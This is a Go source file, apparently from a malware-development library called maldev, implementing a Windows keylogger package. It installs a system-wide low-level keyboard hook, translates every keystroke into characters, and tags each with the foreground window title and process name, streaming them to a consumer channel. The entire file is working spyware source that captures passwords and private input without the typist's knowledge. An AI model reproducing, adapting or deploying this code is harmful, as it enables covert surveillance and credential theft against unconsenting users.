//go:build windows

package keylog

import (
	"context"
	"runtime"
	"sync/atomic"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// Event represents a captured keystroke.
type Event struct {
	KeyCode   int       // Virtual key code
	Character string    // Translated character (UTF-16)
	Window    string    // Foreground window title at capture time
	Process   string    // Foreground process name at capture time
	Time      time.Time // Capture timestamp
}

// kbdllHookStruct mirrors the Win32 KBDLLHOOKSTRUCT layout.
type kbdllHookStruct struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

const (
	whKeyboardLL = 13
	wmKeydown    = 0x0100
	wmSyskeydown = 0x0104
)

// Proc references for APIs not available in x/sys/windows.
var (
	procSetWindowsHookExW       = api.User32.NewProc("SetWindowsHookExW")
	procCallNextHookEx          = api.User32.NewProc("CallNextHookEx")
	procUnhookWindowsHookEx     = api.User32.NewProc("UnhookWindowsHookEx")
	procGetMessageW             = api.User32.NewProc("GetMessageW")
	procGetForegroundWindow     = api.User32.NewProc("GetForegroundWindow")
	procGetWindowTextW          = api.User32.NewProc("GetWindowTextW")
	procGetWindowThreadProcessID = api.User32.NewProc("GetWindowThreadProcessId")
	procGetKeyboardState        = api.User32.NewProc("GetKeyboardState")
	procGetKeyboardLayout       = api.User32.NewProc("GetKeyboardLayout")
	procToUnicodeEx             = api.User32.NewProc("ToUnicodeEx")
	procPostThreadMessageW      = api.User32.NewProc("PostThreadMessageW")
)

// hookState holds per-session state shared between the message loop
// goroutine and the hook callback. Access is synchronized via the
// callback running on the same OS thread as the message loop.
type hookState struct {
	ch     chan Event
	handle uintptr
}

// globalState is process-wide because SetWindowsHookExW requires a
// plain function pointer — closures cannot be passed as HOOKPROC.
// atomic.Pointer avoids mutex contention inside the hook callback,
// which runs on the message loop thread with strict OS timing constraints.
var globalState atomic.Pointer[hookState]

// Start installs a low-level keyboard hook and returns a channel that
// receives keystroke events. The hook runs until the context is
// cancelled. The channel is closed when the hook is removed.
func Start(ctx context.Context) (<-chan Event, error) {
	ch := make(chan Event, 64)
	st := &hookState{ch: ch}
	if !globalState.CompareAndSwap(nil, st) {
		return nil, ErrAlreadyRunning
	}

	ready := make(chan error, 1)

	go func() {
		// The message loop and hook callback must live on the same OS thread.
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		cb := windows.NewCallback(hookProc)
		r, _, err := procSetWindowsHookExW.Call(
			whKeyboardLL,
			cb,
			0, // hMod=0 for thread-level LL hook
			0, // dwThreadId=0 captures all threads
		)
		if r == 0 {
			globalState.Store(nil)
			ready <- err
			close(ch)
			return
		}

		st.handle = r

		ready <- nil

		// Capture the thread ID so the context-cancel goroutine can
		// post WM_QUIT to break the message loop.
		tid := windows.GetCurrentThreadId()

		go func() {
			<-ctx.Done()
			// WM_QUIT (0x0012) terminates GetMessage.
			procPostThreadMessageW.Call(uintptr(tid), 0x0012, 0, 0) //nolint:errcheck
		}()

		// Standard Win32 message pump -- required for LL hooks.
		var msg [48]byte // MSG struct; we only need GetMessage's return value
		for {
			ret, _, _ := procGetMessageW.Call(
				uintptr(unsafe.Pointer(&msg[0])),
				0, 0, 0,
			)
			// GetMessage returns 0 for WM_QUIT, -1 on error.
			if ret == 0 || int32(ret) == -1 {
				break
			}
		}

		procUnhookWindowsHookEx.Call(r) //nolint:errcheck

		globalState.Store(nil)
		close(ch)
	}()

	if err := <-ready; err != nil {
		return nil, err
	}
	return ch, nil
}

// hookProc is the HOOKPROC callback for WH_KEYBOARD_LL.
func hookProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode >= 0 && (wParam == wmKeydown || wParam == wmSyskeydown) {
		kb := (*kbdllHookStruct)(unsafe.Pointer(lParam))

		ev := Event{
			KeyCode: int(kb.VkCode),
			Time:    time.Now(),
		}

		ev.Character = translateKey(kb.VkCode, kb.ScanCode, kb.Flags)
		ev.Window, ev.Process = foregroundInfo()

		st := globalState.Load()

		if st != nil {
			select {
			case st.ch <- ev:
			default:
				// Drop event if consumer is too slow to avoid blocking the hook.
			}
		}
	}

	ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return ret
}

// translateKey converts a virtual key code to a Unicode character string.
func translateKey(vkCode, scanCode, flags uint32) string {
	var keyState [256]byte
	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0]))) //nolint:errcheck

	// Get the keyboard layout for the foreground thread.
	fgWnd, _, _ := procGetForegroundWindow.Call()
	var tid uint32
	if fgWnd != 0 {
		threadID, _, _ := procGetWindowThreadProcessID.Call(fgWnd, 0)
		tid = uint32(threadID)
	}
	hkl, _, _ := procGetKeyboardLayout.Call(uintptr(tid))

	var buf [8]uint16
	// Bit 0 of flags indicates key-up; ToUnicodeEx expects the high bit of
	// scanCode to signal key-up transitions.
	sc := scanCode
	if flags&1 != 0 {
		sc |= 0x8000
	}
	ret, _, _ := procToUnicodeEx.Call(
		uintptr(vkCode),
		uintptr(sc),
		uintptr(unsafe.Pointer(&keyState[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,
		hkl,
	)
	n := int(int32(ret))
	if n > 0 {
		return windows.UTF16ToString(buf[:n])
	}
	return ""
}

// foregroundInfo returns the title and process name of the foreground window.
func foregroundInfo() (title, process string) {
	hwnd, _, _ := procGetForegroundWindow.Call()
	if hwnd == 0 {
		return "", ""
	}

	// Window title.
	var buf [256]uint16
	procGetWindowTextW.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf))) //nolint:errcheck
	title = windows.UTF16ToString(buf[:])

	// Owning process name.
	var pid uint32
	procGetWindowThreadProcessID.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
	if pid == 0 {
		return title, ""
	}

	h, err := windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		return title, ""
	}
	defer windows.CloseHandle(h) //nolint:errcheck

	var nameBuf [windows.MAX_PATH]uint16
	nameLen := uint32(len(nameBuf))
	err = windows.QueryFullProcessImageName(h, 0, &nameBuf[0], &nameLen)
	if err != nil {
		return title, ""
	}
	process = windows.UTF16ToString(nameBuf[:nameLen])
	return title, process
}
